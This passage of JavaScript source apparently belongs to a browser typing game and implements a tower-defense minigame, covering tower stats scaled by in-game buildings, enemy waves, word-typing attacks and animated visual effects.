    return (epsilon < lambda && lambda < 1 - epsilon) && (epsilon < gamma && gamma < 1 - epsilon);
}

// Tower Defense Game Variables
let arcadeUIState = "";
let arcadeActive = false;
let arcadeTick = 0;
let arcadeWave = 1;
let arcadeEnemiesRemaining = 0;
let arcadeTicksToNextWave = 300; // 10 seconds between waves
let arcadeEnemies = [];
let arcadeProjectiles = [];
let arcadeEnemySpawnQueue = []; // Queue for enemy spawns with tick timing

// Tower Stats (Base values)
let towerStats = {
    damage: 100,
    maxHealth: 100,
    currentHealth: 100,
    attackRate: 1, // attacks per second
    range: 10, // meters
    auraRange: 5, // meters
    lastAttackTick: 0, // Last attack tick instead of time
    // Upgrade stats
    slowAura: 0, // percentage slow
    knockback: 0, // meters
    critChance: 0, // percentage
    critDamage: 100, // base 100% damage
    multishotChance: 0, // percentage
    multishotCount: 1, // base projectile count
    bounceChance: 0, // percentage
    damageReduction: 0, // percentage
    healthRegen: 0 // health per second
};

function updateTowerStats() {
    // Reset to base stats
    towerStats.damage = 100;
    towerStats.maxHealth = 100;
    towerStats.attackRate = 1;
    towerStats.range = 5.5;
    towerStats.auraRange = 5;
    towerStats.slowAura = 0;
    towerStats.knockback = 0;
    towerStats.critChance = 0;
    towerStats.critDamage = 100;
    towerStats.multishotChance = 0;
    towerStats.multishotCount = 1;
    towerStats.bounceChance = 0;
    towerStats.damageReduction = 0;
    towerStats.healthRegen = 0;

    // Apply building upgrades
    if (typeof AutoWriter !== 'undefined') {
        towerStats.damage += AutoWriter.level; // +1 dmg per Auto Writer
    }
    if (typeof Printer !== 'undefined') {
        towerStats.maxHealth += Printer.level; // +1 max hp per Printer
    }
    if (typeof ResearchLab !== 'undefined') {
        towerStats.attackRate += ResearchLab.level * 0.01; // +0.01 attack/sec per Research Lab
    }
    if (typeof CyberCafe !== 'undefined') {
        towerStats.range += CyberCafe.level * 0.01; // +0.01m range per Cyber Cafe
    }
    if (typeof ServerFarm !== 'undefined') {
        towerStats.slowAura = Math.min(80, ServerFarm.level * 0.1); // +0.1% slow aura per Server Farm (max 80%)
    }
    if (typeof TypingArena !== 'undefined') {
        towerStats.auraRange += TypingArena.level * 0.01; // +0.01m aura range per Typing Arena
    }
    if (typeof ITOffice !== 'undefined') {
        towerStats.knockback += ITOffice.level * 0.1; // +0.1m knockback per IT Office
    }
    if (typeof StockMarket !== 'undefined') {
        towerStats.critChance = Math.min(100, StockMarket.level * 0.1); // +0.1% crit chance per Stock Market (max 100%)
    }
    if (typeof MagazinePublisher !== 'undefined') {
        towerStats.critDamage += MagazinePublisher.level; // +1% crit damage per Magazine Publisher
    }
    if (typeof TypingGuild !== 'undefined') {
        towerStats.multishotChance = Math.min(100, TypingGuild.level * 0.1); // +0.1% multishot chance per Typing Guild (max 100%)
    }
    if (typeof HackerGroup !== 'undefined') {
        towerStats.multishotCount += Math.min(10, HackerGroup.level * 0.01); // +0.01 multishot count per Hacker Group (max +10)
    }
    if (typeof KeystrokeCasino !== 'undefined') {
        towerStats.bounceChance = Math.min(100, KeystrokeCasino.level * 0.1); // +0.1% bounce chance per Keystroke Casino (max 100%)
    }
    if (typeof AIAgent !== 'undefined') {
        towerStats.maxHealth += AIAgent.level * 100; // +100 max hp per AI Agent
        towerStats.healthRegen += AIAgent.level * 1; // +1 hp/s regen per AI Agent
        towerStats.damageReduction = Math.min(99, AIAgent.level * 0.1); // +0.1% damage reduction per AI Agent (max 99%)
    }

    // Ensure current health doesn't exceed max health
    if (towerStats.currentHealth > towerStats.maxHealth) {
        towerStats.currentHealth = towerStats.maxHealth;
    }
}

function displayArcade() {
    if(GameArcade.level > 0) {
        document.getElementById('arcade-tab').disabled = false;
    }
    
    updateTowerStats();
    
    if (arcadeActive) {
        if (arcadeUIState !== "active") {
            arcadeUIState = "active";
            document.getElementById('arcade-tab').classList.remove("ready");
            document.getElementById('arcade-start').style.display = "none";
            document.getElementById('arcade-timeleft').style.display = "block";
            document.getElementById('arcade-cooldown').style.display = "none";
            document.getElementById('arcade-input-box').focus();
            document.getElementById('arcade-game').classList.add('arcade-active');
        }        
        tickTowerDefense();
        updateArcadeUI();
        updateTowerVisuals();
    } else {
        // Remove active class when game is not active
        document.getElementById('arcade-game').classList.remove('arcade-active');
        
        let cooldownBoost = modifiers.find(modifier => modifier.name === "Arcade cooldown");
        if (!cooldownBoost) {
            if (arcadeUIState !== "ready") {
                arcadeUIState = "ready";
                document.getElementById('arcade-input-box').value = "";
                document.getElementById('arcade-tab').classList.add("ready");
                document.getElementById('arcade-start').style.display = "block";
                document.getElementById('arcade-timeleft').style.display = "none";
                document.getElementById('arcade-cooldown').style.display = "none";
            }        } else {
            if (arcadeUIState !== "cooldown") {
                arcadeUIState = "cooldown";
                document.getElementById('arcade-wave-reached').innerText = arcadeWave;
                document.getElementById('arcade-tab').classList.remove("ready");
                document.getElementById('arcade-cooldown').style.display = "block";
                document.getElementById('arcade-start').style.display = "none";
                document.getElementById('arcade-timeleft').style.display = "none";
            }
            document.getElementById('arcade-cooldown-remaining').innerText = (cooldownBoost.duration / Tickrate).toFixed(0);
        }
    }
}

function updateArcadeUI() {
    // Update tower health display
    const healthElement = document.getElementById('tower-health');
    if (healthElement) {
        const healthPercent = (towerStats.currentHealth / towerStats.maxHealth) * 100;
        healthElement.innerText = `${Math.ceil(towerStats.currentHealth)}/${towerStats.maxHealth}`;
        healthElement.style.color = healthPercent > 50 ? '#4CAF50' : healthPercent > 25 ? '#FF9800' : '#F44336';
    }
    
    // Update tower stats display
    updateTowerStatsDisplay();
}

function updateTowerStatsDisplay() {
    const statsElement = document.getElementById('tower-detailed-stats');
    if (statsElement) {
        const attackRateDisplay = towerStats.attackRate.toFixed(2);
        const rangeDisplay = towerStats.range.toFixed(1);
        const auraDisplay = towerStats.auraRange.toFixed(1);
        
        // Wave status information
        const nextWaveTime = Math.ceil(arcadeTicksToNextWave / Tickrate);
        const waveStatus = arcadeEnemiesRemaining > 0 ? `${arcadeEnemiesRemaining} enemies` : `${nextWaveTime}s to wave`;
        
        let statsHTML = `
            <div style="font-size: 12px; line-height: 1.3;">
                <div style="background: rgba(100, 150, 255, 0.2); padding: 4px 6px; margin-bottom: 6px; border-radius: 3px; border-left: 3px solid #4a90e2;">
                    <div style="color: #ffffff; font-weight: bold; font-size: 13px;">🌊 Wave ${arcadeWave}</div>
                    <div style="color: #cccccc; font-size: 11px;">${waveStatus}</div>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 4px; margin-bottom: 6px;">
                    <div style="color: #ff6b6b; font-weight: bold;">⚔️ DMG: ${towerStats.damage}</div>
                    <div style="color: #4ecdc4;">⚡ Rate: ${attackRateDisplay}/s</div>
                    <div style="color: #45b7d1;">📡 Range: ${rangeDisplay}m</div>
                    <div style="color: #96ceb4;">🌀 Aura: ${auraDisplay}m</div>
                </div>
        `;
        
        // Special abilities section
        const abilities = [];
        if (towerStats.critChance > 0) {
            abilities.push(`<div style="color: #ffd93d;">💥 Crit: ${towerStats.critChance.toFixed(1)}% (${towerStats.critDamage}%)</div>`);
        }
        if (towerStats.slowAura > 0) {
            abilities.push(`<div style="color: #74b9ff;">❄️ Slow: ${towerStats.slowAura.toFixed(1)}%</div>`);
        }
        if (towerStats.multishotChance > 0) {
            abilities.push(`<div style="color: #fd79a8;">🎯 Multi: ${towerStats.multishotChance.toFixed(1)}% (${towerStats.multishotCount.toFixed(1)}x)</div>`);
        }
        if (towerStats.bounceChance > 0) {
            abilities.push(`<div style="color: #e17055;">⚡ Bounce: ${towerStats.bounceChance.toFixed(1)}%</div>`);
        }
        if (towerStats.knockback > 0) {
            abilities.push(`<div style="color: #a29bfe;">💨 Knockback: ${towerStats.knockback.toFixed(1)}m</div>`);
        }
        if (towerStats.damageReduction > 0) {
            abilities.push(`<div style="color: #00b894;">🛡️ Resist: ${towerStats.damageReduction.toFixed(1)}%</div>`);
        }
        if (towerStats.healthRegen > 0) {
            abilities.push(`<div style="color: #00cec9;">💚 Regen: ${towerStats.healthRegen.toFixed(1)}/s</div>`);
        }
        
        if (abilities.length > 0) {
            statsHTML += `
                <div style="border-top: 1px solid rgba(100, 150, 255, 0.2); padding-top: 4px; margin-top: 4px;">
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2px;">
                        ${abilities.join('')}
                    </div>
                </div>
            `;
        }
        
        statsHTML += '</div>';
        statsElement.innerHTML = statsHTML;
    }
}

document.getElementById('arcade-input-box').addEventListener('input', function() {
    if(arcadeActive) {
        const inputText = document.getElementById('arcade-input-box').value.trim();
        
        // Find and attack enemy with matching word
        for (let i = 0; i < arcadeEnemies.length; i++) {
            const enemy = arcadeEnemies[i];
            if (enemy.word === inputText) {                // Deal damage to enemy
                let damage = towerStats.damage;
                let effectType = 'normal';
                enemy.health -= damage;
                
                // Check for critical hit
                if (Math.random() * 100 < towerStats.critChance) {
                    const critDamage = towerStats.damage * (towerStats.critDamage / 100);
                    enemy.health -= critDamage - towerStats.damage; // Add extra crit damage
                    effectType = 'crit';
                }
                
                // Visual effect for main attack
                createAttackEffect(400, 300, enemy.x_pos, enemy.y_pos, effectType);
                
                // Check for multishot
                if (Math.random() * 100 < towerStats.multishotChance) {
                    const multishotTargets = Math.floor(towerStats.multishotCount);
                    let targetsHit = 0;
                    for (let j = 0; j < arcadeEnemies.length && targetsHit < multishotTargets; j++) {
                        if (j !== i && arcadeEnemies[j].alive) {
                            arcadeEnemies[j].health -= towerStats.damage * 0.5; // Multishot does 50% damage
                            // Visual effect for multishot
                            createAttackEffect(400, 300, arcadeEnemies[j].x_pos, arcadeEnemies[j].y_pos, 'multishot');
                            targetsHit++;
                        }
                    }
                }
                
                // Apply knockback
                if (towerStats.knockback > 0) {
                    const angle = Math.atan2(enemy.y_pos - 300, enemy.x_pos - 400); // Away from center
                    enemy.x_pos += Math.cos(angle) * towerStats.knockback * 10;
                    enemy.y_pos += Math.sin(angle) * towerStats.knockback * 10;
                }
                
                // Check if enemy is dead
                if (enemy.health <= 0) {
                    enemyDied(enemy);
                }
                
                document.getElementById('arcade-input-box').value = "";
                playExplosionSound();
                break;
            }
        }
    }
});

function createTower() {
    // Remove existing tower if any
    const existingTower = document.getElementById('tower');
    if (existingTower) {
        existingTower.remove();
    }
    
    // Create new tower element
    const tower = document.createElement('div');
    tower.id = 'tower';
    tower.style.position = 'absolute';
    tower.style.top = '280px';
    tower.style.left = '380px';
    tower.style.zIndex = '5';
    
    document.getElementById('arcade-game-canvas').appendChild(tower);
}

function startArcadeMinigame() {
    if(arcadeActive) return;
    arcadeActive = true;
    arcadeEnemies = [];
    arcadeProjectiles = [];
    arcadeEnemySpawnQueue = [];
    arcadeTick = 0;
    arcadeWave = 1;
    arcadeEnemiesRemaining = 0;
    arcadeTicksToNextWave = 300; // 10 seconds until first wave
    
    // Reset tower health
    updateTowerStats();
    towerStats.currentHealth = towerStats.maxHealth;
    towerStats.lastAttackTick = 0;
    
    // Create tower element dynamically
    createTower();
}

function createEnemy() {
    // Enemy type selection based on wave
    let enemyType = 'normal';
    let word;
    
    if (arcadeWave >= 5 && Math.random() < 0.2) {
        enemyType = 'fast';
        word = getRandomWord(Math.min(2 + Math.floor(arcadeWave / 4), 6)); // Shorter words for fast enemies
    } else if (arcadeWave >= 3 && Math.random() < 0.15) {
        enemyType = 'tank';
        word = getRandomWord(Math.min(4 + Math.floor(arcadeWave / 2), 10)); // Longer words for tank enemies
    } else if (arcadeWave >= 7 && Math.random() < 0.1) {
        enemyType = 'regen';
        word = getRandomWord(Math.min(3 + Math.floor(arcadeWave / 3), 8));
    } else {
        word = getRandomWord(Math.min(3 + Math.floor(arcadeWave / 3), 8));
    }
    
    const enemyElement = document.createElement('div');
    enemyElement.classList.add('arcade-enemy');
    enemyElement.innerText = word;
    
    // Enemy spawns from random edge of the screen
    const side = Math.floor(Math.random() * 4); // 0=top, 1=right, 2=bottom, 3=left
    let x_pos, y_pos;
    
    switch(side) {
        case 0: // Top
            x_pos = Math.random() * 800;
            y_pos = -50;
            break;
        case 1: // Right
            x_pos = 850;
            y_pos = Math.random() * 600;
            break;
        case 2: // Bottom
            x_pos = Math.random() * 800;
            y_pos = 650;
            break;
        case 3: // Left
            x_pos = -50;
            y_pos = Math.random() * 600;
            break;
    }
    
    // Base enemy stats
    let baseHealth = 50 + (arcadeWave - 1) * 25;
    let baseSpeed = 0.5 + (arcadeWave - 1) * 0.1;
    let baseDamage = 5 + (arcadeWave - 1) * 2;
    let regenRate = 0;
    
    // Apply enemy type modifiers
    switch (enemyType) {
        case 'fast':
            baseSpeed *= 2;
            baseHealth *= 0.6;
            baseDamage *= 0.8;
            enemyElement.style.color = '#00ffff';
            enemyElement.style.textShadow = '0 0 8px #00ffff';
            enemyElement.style.borderColor = '#00ffff';
            break;
        case 'tank':
            baseHealth *= 3;
            baseSpeed *= 0.4;
            baseDamage *= 1.5;
            enemyElement.style.color = '#ffaa00';
            enemyElement.style.textShadow = '0 0 8px #ffaa00';
            enemyElement.style.borderColor = '#ffaa00';
            enemyElement.style.fontWeight = 'bold';
            break;
        case 'regen':
            baseHealth *= 1.5;
            regenRate = Math.max(5, baseHealth * 0.02); // 2% health per second
            enemyElement.style.color = '#00ff00';
            enemyElement.style.textShadow = '0 0 8px #00ff00';
            enemyElement.style.borderColor = '#00ff00';
            break;
    }    const enemy = {
        word: word,
        x_pos: x_pos,
        y_pos: y_pos,
        health: baseHealth,
        maxHealth: baseHealth,
        speed: baseSpeed,
        damage: baseDamage,
        element: enemyElement,
        alive: true,
        slowEffect: 0, // Current slow percentage
        bounceTargets: [], // Enemies already hit by bounce
        type: enemyType,
        regenRate: regenRate,
        lastRegenTick: arcadeTick,
        isAttackingTower: false, // Whether enemy is at tower attacking
        lastAttackTick: 0 // When enemy last attacked tower (in ticks)
    };
    
    arcadeEnemies.push(enemy);
    enemyElement.style.left = x_pos + "px";
    enemyElement.style.top = y_pos + "px";
    document.getElementById('arcade-game-canvas').appendChild(enemyElement);
    arcadeEnemiesRemaining++;
}

function tickTowerDefense() {
    if (!arcadeActive) return;
    
    arcadeTick++;
      // Tower health regeneration
    if (towerStats.healthRegen > 0 && towerStats.currentHealth < towerStats.maxHealth) {
        towerStats.currentHealth += towerStats.healthRegen / Tickrate;
        if (towerStats.currentHealth > towerStats.maxHealth) {
            towerStats.currentHealth = towerStats.maxHealth;
        }
        
        // Update tower visual state based on health
        const tower = document.getElementById('tower');
        if (tower) {
            const healthPercent = (towerStats.currentHealth / towerStats.maxHealth) * 100;
            if (healthPercent > 25) {
                tower.classList.remove('tower-low-health');
            }
        }
    }
    
    // Wave management
    arcadeTicksToNextWave--;
      // Check if all enemies are dead and wave is complete
    if (arcadeEnemiesRemaining <= 0 && arcadeTicksToNextWave <= 0) {
        arcadeWave++;
        arcadeTicksToNextWave = 300; // 10 seconds between waves
        
        // Spawn enemies for new wave with staggered timing
        const enemiesInWave = Math.min(5 + Math.floor(arcadeWave / 2), 15);
        for (let i = 0; i < enemiesInWave; i++) {
            arcadeEnemySpawnQueue.push({
                spawnTick: arcadeTick + (i * 3) // Spawn every 3 ticks (0.1 seconds)
            });
        }
    }
    
    // Initial wave spawn
    if (arcadeWave === 1 && arcadeTicksToNextWave === 1) {
        for (let i = 0; i < 5; i++) {
            arcadeEnemySpawnQueue.push({
                spawnTick: arcadeTick + (i * 3) // Spawn every 3 ticks (0.1 seconds)
            });
        }    }
    
    // Process enemy spawn queue
    arcadeEnemySpawnQueue = arcadeEnemySpawnQueue.filter(spawn => {
        if (arcadeTick >= spawn.spawnTick) {
            createEnemy();
            return false; // Remove from queue
        }
        return true; // Keep in queue
    });
    
    // Update enemies
    arcadeEnemies.forEach((enemy, index) => {
        if (!enemy.alive) return;
          // Enemy regeneration for regen type
        if (enemy.type === 'regen' && enemy.regenRate > 0) {
            if (arcadeTick - enemy.lastRegenTick >= 30) { // Regenerate every second (30 ticks)
                enemy.health = Math.min(enemy.maxHealth, enemy.health + enemy.regenRate);
                enemy.lastRegenTick = arcadeTick;
            }
        }
        
        // Move enemy towards tower (center: 400, 300)
        const towerX = 400;
        const towerY = 300;
        const dx = towerX - enemy.x_pos;
        const dy = towerY - enemy.y_pos;
        const distance = Math.sqrt(dx * dx + dy * dy);
          if (distance > 50) { // Not at tower yet
            // Apply slow aura effect
            enemy.slowEffect = 0;
            if (distance <= towerStats.auraRange * 30) { // Convert meters to pixels (roughly)
                enemy.slowEffect = towerStats.slowAura;
            }
            
            // Move towards tower
            const speed = enemy.speed * (1 - enemy.slowEffect / 100);
            enemy.x_pos += (dx / distance) * speed;
            enemy.y_pos += (dy / distance) * speed;
            
            enemy.element.style.left = enemy.x_pos + "px";
            enemy.element.style.top = enemy.y_pos + "px";
            
            // Update enemy health bar visual
            const healthPercent = (enemy.health / enemy.maxHealth) * 100;
            if (healthPercent < 100) {
                enemy.element.style.background = `linear-gradient(90deg, red ${healthPercent}%, transparent ${healthPercent}%)`;
            }        } else {
            // Enemy reached tower - enter attack mode
            if (!enemy.isAttackingTower) {
                enemy.isAttackingTower = true;
                enemy.lastAttackTick = arcadeTick;
                // Add visual indicator that enemy is attacking tower
                enemy.element.style.boxShadow = '0 0 10px red, 0 0 20px red';
                enemy.element.style.animation = 'pulse 1s infinite';
            }
            
            // Attack tower every 1 second (30 ticks)
            if (arcadeTick - enemy.lastAttackTick >= 30) {
                const damage = enemy.damage * (1 - towerStats.damageReduction / 100);
                towerStats.currentHealth -= damage;
                enemy.lastAttackTick = arcadeTick;
                
                // Visual feedback for tower taking damage
                const tower = document.getElementById('tower');
                if (tower) {
                    tower.classList.add('tower-damaged');
                    setTimeout(() => {
                        tower.classList.remove('tower-damaged');
                    }, 500);
                    
                    // Add low health visual if health is below 25%
                    const healthPercent = (towerStats.currentHealth / towerStats.maxHealth) * 100;
                    if (healthPercent <= 25) {
                        tower.classList.add('tower-low-health');
                    } else {
                        tower.classList.remove('tower-low-health');
                    }
                }
                
                // Check if tower is destroyed
                if (towerStats.currentHealth <= 0) {
                    finishTowerDefense();
                    return;
                }
            }
        }
    });
    
    // Remove dead enemies from array
    arcadeEnemies = arcadeEnemies.filter(enemy => enemy.alive);
      // Tower auto-attack
    const attackInterval = Math.floor(30 / towerStats.attackRate); // Convert attacks per second to ticks
    if (arcadeTick - towerStats.lastAttackTick >= attackInterval) {
        autoAttackEnemies();
        towerStats.lastAttackTick = arcadeTick;
    }
}

function enemyDied(enemy) {
    // Remove enemy from the game
    enemy.alive = false;
    enemy.element.classList.add('arcade-remove-animation');
    setTimeout(() => {
        if (enemy.element.parentNode) {
            enemy.element.remove();
        }
    }, 500);
    arcadeEnemiesRemaining--;

    let keyStrokeModCount = applyKPStoManual(enemy.word.length);
    keyStrokeModCount = applyModifiers(0, keyStrokeModCount);
    totalKeystrokes += keyStrokeModCount;
    keystrokesBank += keyStrokeModCount;

    createFloatingBounty(`<img src="images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin"> +${formatShortScale(keyStrokeModCount)}`, enemy.x_pos, enemy.y_pos);
}


function createFloatingBounty(word, x, y) {
        const gameContainer = document.getElementById('arcade-game');
        const floatingWord = document.createElement('div');
        floatingWord.innerHTML = word;
        floatingWord.className = 'floating-word';

        const rect = gameContainer.getBoundingClientRect();

        // Set the left property randomly between 0% and 10%
        floatingWord.style.left = `${x + rect.left}px`;
        floatingWord.style.top = `${y + rect.top}px`;
        // Set a random animation duration between 1s and 3s
        const randomDuration = (Math.random() * 2 + 1).toFixed(2);
        floatingWord.style.animationDuration = randomDuration + 's';
        
        gameContainer.appendChild(floatingWord);
        
        // Remove the floating word after the animation completes
        setTimeout(() => {
            gameContainer.removeChild(floatingWord);
        }, randomDuration * 1000); // Convert the duration to milliseconds
    }

function autoAttackEnemies() {
    // Find closest enemy in range
    let closestEnemy = null;
    let closestDistance = Infinity;
    const towerX = 400;
    const towerY = 300;
    
    arcadeEnemies.forEach(enemy => {
        if (!enemy.alive) return;
        
        const dx = towerX - enemy.x_pos;
        const dy = towerY - enemy.y_pos;
        const distance = Math.sqrt(dx * dx + dy * dy);
        
        if (distance <= towerStats.range * 30 && distance < closestDistance) { // Convert meters to pixels
            closestEnemy = enemy;
            closestDistance = distance;
        }
    });    if (closestEnemy) {
        // Tower firing visual feedback
        const tower = document.getElementById('tower');
        if (tower) {
            tower.classList.add('tower-firing');
            setTimeout(() => {
                tower.classList.remove('tower-firing');
            }, 200);
        }
        
        // Deal damage
        let damage = towerStats.damage;
        let effectType = 'normal';
        
        // Check for critical hit
        if (Math.random() * 100 < towerStats.critChance) {
            damage *= (towerStats.critDamage / 100);
            effectType = 'crit';
        }
        
        closestEnemy.health -= damage;
        
        // Check for bounce
        if (Math.random() * 100 < towerStats.bounceChance) {
            bounceAttack(closestEnemy, damage * 0.7); // Bounce does 70% damage
            if (effectType === 'normal') effectType = 'bounce';
        }
        
        // Visual effect with appropriate type
        createAttackEffect(towerX, towerY, closestEnemy.x_pos, closestEnemy.y_pos, effectType);
        
        // Check if enemy is dead
        if (closestEnemy.health <= 0) {
            enemyDied(closestEnemy);
        }
    }
}

function bounceAttack(originalEnemy, damage) {
    // Find nearest enemy to bounce to (that hasn't been hit by this bounce chain)
    let nearestEnemy = null;
    let nearestDistance = Infinity;
    
    arcadeEnemies.forEach(enemy => {
        if (!enemy.alive || enemy === originalEnemy) return;
        if (originalEnemy.bounceTargets.includes(enemy)) return;
        
        const dx = originalEnemy.x_pos - enemy.x_pos;
        const dy = originalEnemy.y_pos - enemy.y_pos;
        const distance = Math.sqrt(dx * dx + dy * dy);
        
        if (distance < nearestDistance && distance <= 100) { // Max bounce range
            nearestEnemy = enemy;
            nearestDistance = distance;
        }
    });
      if (nearestEnemy) {
        nearestEnemy.health -= damage;
        originalEnemy.bounceTargets.push(nearestEnemy);
        
        // Visual effect for bounce
        createAttackEffect(originalEnemy.x_pos, originalEnemy.y_pos, nearestEnemy.x_pos, nearestEnemy.y_pos, 'bounce');
        
        if (nearestEnemy.health <= 0) {
            enemyDied(nearestEnemy);
        }
    }
}

function createAttackEffect(x1, y1, x2, y2, effectType = 'normal') {
    // Create muzzle flash at tower
    createMuzzleFlash(x1, y1);
    
    // Create energy beam
    createEnergyBeam(x1, y1, x2, y2, effectType);
    
    // Create impact effect at target
    createImpactEffect(x2, y2, effectType);
}

function createMuzzleFlash(x, y) {
    const flash = document.createElement('div');
    flash.style.position = 'absolute';
    flash.style.left = (x - 10) + 'px';
    flash.style.top = (y - 10) + 'px';
    flash.style.width = '20px';
    flash.style.height = '20px';
    flash.style.borderRadius = '50%';
    flash.style.background = 'radial-gradient(circle, #ffffff 0%, #ffff00 30%, #ff6600 60%, transparent 100%)';
    flash.style.boxShadow = '0 0 20px #ffff00, 0 0 40px #ff6600';
    flash.style.zIndex = '15';
    flash.style.animation = 'muzzleFlash 0.2s ease-out';
    
    document.getElementById('arcade-game-canvas').appendChild(flash);
    
    setTimeout(() => {
        if (flash.parentNode) {
            flash.remove();
        }
    }, 200);
}

function createEnergyBeam(x1, y1, x2, y2, effectType) {
    const dx = x2 - x1;
    const dy = y2 - y1;
    const length = Math.sqrt(dx * dx + dy * dy);
    const angle = Math.atan2(dy, dx) * (180 / Math.PI);
    
    // Main beam
    const beam = document.createElement('div');
    beam.style.position = 'absolute';
    beam.style.left = x1 + 'px';
    beam.style.top = y1 + 'px';
    beam.style.width = length + 'px';
    beam.style.height = '4px';
    beam.style.transformOrigin = '0 0';
    beam.style.transform = `rotate(${angle}deg)`;
    beam.style.zIndex = '12';
    
    // Set the CSS custom property for the beam angle
    beam.style.setProperty('--beam-angle', `${angle}deg`);
    
    // Different beam styles based on effect type
    switch(effectType) {
        case 'crit':
            beam.style.background = 'linear-gradient(90deg, #ff0000, #ffff00, #ff0000)';
            beam.style.boxShadow = '0 0 10px #ff0000, 0 0 20px #ffff00';
            beam.style.animation = 'critBeam 0.3s ease-out';
            break;
        case 'multishot':
            beam.style.background = 'linear-gradient(90deg, #00ffff, #ffffff, #00ffff)';
            beam.style.boxShadow = '0 0 8px #00ffff, 0 0 16px #ffffff';
            beam.style.animation = 'multishotBeam 0.25s ease-out';
            break;
        case 'bounce':
            beam.style.background = 'linear-gradient(90deg, #ff00ff, #ffffff, #ff00ff)';
            beam.style.boxShadow = '0 0 8px #ff00ff, 0 0 16px #ffffff';
            beam.style.animation = 'bounceBeam 0.25s ease-out';
            break;
        default:
            beam.style.background = 'linear-gradient(90deg, #00ff00, #ffffff, #00ff00)';
            beam.style.boxShadow = '0 0 6px #00ff00, 0 0 12px #ffffff';
            beam.style.animation = 'normalBeam 0.2s ease-out';
    }
    
    document.getElementById('arcade-game-canvas').appendChild(beam);
    
    // Create beam particles
    createBeamParticles(x1, y1, x2, y2, effectType);
    
    setTimeout(() => {
        if (beam.parentNode) {
            beam.remove();
        }
    }, 300);
}

function createBeamParticles(x1, y1, x2, y2, effectType) {
    const particleCount = 8;
    const dx = x2 - x1;
    const dy = y2 - y1;
    
    for (let i = 0; i < particleCount; i++) {
        const t = (i + 1) / (particleCount + 1); // Position along the beam
        const px = x1 + dx * t + (Math.random() - 0.5) * 10;
        const py = y1 + dy * t + (Math.random() - 0.5) * 10;
        
        const particle = document.createElement('div');
        particle.style.position = 'absolute';
        particle.style.left = px + 'px';
        particle.style.top = py + 'px';
        particle.style.width = '3px';
        particle.style.height = '3px';
        particle.style.borderRadius = '50%';
        particle.style.zIndex = '13';
        
        switch(effectType) {
            case 'crit':
                particle.style.background = '#ff0000';
                particle.style.boxShadow = '0 0 6px #ff0000';
                break;
            case 'multishot':
                particle.style.background = '#00ffff';
                particle.style.boxShadow = '0 0 6px #00ffff';
                break;
            case 'bounce':
                particle.style.background = '#ff00ff';
                particle.style.boxShadow = '0 0 6px #ff00ff';
                break;
            default:
                particle.style.background = '#00ff00';
                particle.style.boxShadow = '0 0 4px #00ff00';
        }
        
        particle.style.animation = 'beamParticle 0.4s ease-out';
        
        document.getElementById('arcade-game-canvas').appendChild(particle);
        
        setTimeout(() => {
            if (particle.parentNode) {
                particle.remove();
            }
        }, 400);
    }
}

function createImpactEffect(x, y, effectType) {
    const impact = document.createElement('div');
    impact.style.position = 'absolute';
    impact.style.left = (x - 15) + 'px';
    impact.style.top = (y - 15) + 'px';
    impact.style.width = '30px';
    impact.style.height = '30px';
    impact.style.borderRadius = '50%';
    impact.style.zIndex = '14';
    
    switch(effectType) {
        case 'crit':
            impact.style.background = 'radial-gradient(circle, #ff0000 0%, #ffff00 40%, transparent 70%)';
            impact.style.boxShadow = '0 0 30px #ff0000, 0 0 60px #ffff00';
            impact.style.animation = 'critImpact 0.5s ease-out';
            break;
        case 'multishot':
            impact.style.background = 'radial-gradient(circle, #00ffff 0%, #ffffff 40%, transparent 70%)';
            impact.style.boxShadow = '0 0 25px #00ffff, 0 0 50px #ffffff';
            impact.style.animation = 'multishotImpact 0.4s ease-out';
            break;
        case 'bounce':
            impact.style.background = 'radial-gradient(circle, #ff00ff 0%, #ffffff 40%, transparent 70%)';
            impact.style.boxShadow = '0 0 25px #ff00ff, 0 0 50px #ffffff';
            impact.style.animation = 'bounceImpact 0.4s ease-out';
            break;
        default:
            impact.style.background = 'radial-gradient(circle, #00ff00 0%, #ffffff 40%, transparent 70%)';
            impact.style.boxShadow = '0 0 20px #00ff00, 0 0 40px #ffffff';
            impact.style.animation = 'normalImpact 0.3s ease-out';
    }
    
    document.getElementById('arcade-game-canvas').appendChild(impact);
    
    // Create impact sparks
    createImpactSparks(x, y, effectType);
    
    setTimeout(() => {
        if (impact.parentNode) {
            impact.remove();
        }
    }, 500);
}

function createImpactSparks(x, y, effectType) {
    const sparkCount = effectType === 'crit' ? 12 : 6;
    
    for (let i = 0; i < sparkCount; i++) {
        const angle = (Math.PI * 2 * i) / sparkCount;
        const distance = 20 + Math.random() * 15;
        const sparkX = x + Math.cos(angle) * distance;
        const sparkY = y + Math.sin(angle) * distance;
        
        const spark = document.createElement('div');
        spark.style.position = 'absolute';
        spark.style.left = sparkX + 'px';
        spark.style.top = sparkY + 'px';
        spark.style.width = '2px';
        spark.style.height = '8px';
        spark.style.borderRadius = '50%';
        spark.style.transform = `rotate(${angle + Math.PI/2}rad)`;
        spark.style.zIndex = '13';
        
        switch(effectType) {
            case 'crit':
                spark.style.background = 'linear-gradient(0deg, transparent, #ff0000, #ffff00)';
                break;
            case 'multishot':
                spark.style.background = 'linear-gradient(0deg, transparent, #00ffff, #ffffff)';
                break;
            case 'bounce':
                spark.style.background = 'linear-gradient(0deg, transparent, #ff00ff, #ffffff)';
                break;
            default:
                spark.style.background = 'linear-gradient(0deg, transparent, #00ff00, #ffffff)';
        }
        
        spark.style.animation = 'impactSpark 0.6s ease-out';
        
        document.getElementById('arcade-game-canvas').appendChild(spark);
        
        setTimeout(() => {
            if (spark.parentNode) {
                spark.remove();
            }
        }, 600);
    }
}

function updateTowerVisuals() {
    // Remove existing range indicators
    const canvas = document.getElementById('arcade-game-canvas');
    const existingRangeIndicators = canvas.querySelectorAll('.tower-range-indicator, .tower-aura-indicator');
    existingRangeIndicators.forEach(indicator => indicator.remove());
    
    if (!arcadeActive) return;
    
    const towerX = 400;
    const towerY = 300;
    
    // Create aura range indicator (inner circle)
    if (towerStats.auraRange > 0 && towerStats.slowAura > 0) {
        const auraIndicator = document.createElement('div');
        auraIndicator.className = 'tower-aura-indicator';
        const auraRadius = towerStats.auraRange * 30; // Convert meters to pixels (30px = 1m)
        auraIndicator.style.position = 'absolute';
        auraIndicator.style.left = (towerX - auraRadius) + 'px';
        auraIndicator.style.top = (towerY - auraRadius) + 'px';
        auraIndicator.style.width = (auraRadius * 2) + 'px';
        auraIndicator.style.height = (auraRadius * 2) + 'px';
